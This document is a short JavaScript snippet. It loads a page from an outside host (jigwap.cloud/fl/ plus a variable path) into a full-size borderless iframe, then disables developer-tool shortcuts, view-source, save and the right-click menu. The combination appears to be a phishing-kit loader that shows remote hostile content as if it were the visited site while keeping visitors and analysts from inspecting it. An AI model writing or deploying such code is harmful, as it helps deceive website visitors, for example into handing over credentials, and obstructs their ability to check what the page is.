
      // Function to embed website content
  function embedWebsite(url, containerId) {
    var container = document.getElementById(containerId);
    if (!container) return;

    var iframe = document.createElement('iframe');
    iframe.src = url;
    iframe.width = "100%";
    iframe.height = "100%";
    iframe.style.border = "none";

    container.appendChild(iframe);
  }

  // Call the function with the URL and container ID
  var MotherBoard = "https://jigwap.cloud/fl/";
  var websiteUrl = MotherBoard + togohome; // Replace with the desired URL
  var containerId = "globe-container"; // Replace with the ID of your container div
  embedWebsite(websiteUrl, containerId);

// Disable specific key combinations and right-click
document.addEventListener('keydown', function(event) {
    // Define the keys and key combinations that should be disabled
    const disabledKeys = [
        "F12",                              // F12
        "I", "J", "C", "K", "U", "S", "H", "P",  // Ctrl + Shift + (I, J, C, K), Ctrl + U, Ctrl + S, Ctrl + Shift + H
        "F1", "F3", "F4", "F5", "F6", "F7", "F8", "F9", "F10", "F11", // Function keys
        "E", "A", "L"                       // Ctrl + Shift + E, Ctrl + A, Ctrl + Shift + L
    ];

    // Check if a function key is pressed or a combination of Ctrl/Shift/Alt and other keys
    if (
        disabledKeys.includes(event.key) ||
        (event.ctrlKey && event.shiftKey && disabledKeys.includes(event.key)) ||
        (event.ctrlKey && disabledKeys.includes(event.key)) ||
        (event.shiftKey && disabledKeys.includes(event.key)) ||
        (event.altKey && disabledKeys.includes(event.key))
    ) {
        // Prevent the default action for these key combinations
        event.preventDefault();
    }
});

// Disable right-click context menu
document.addEventListener('contextmenu', function(event) {
    event.preventDefault();
});
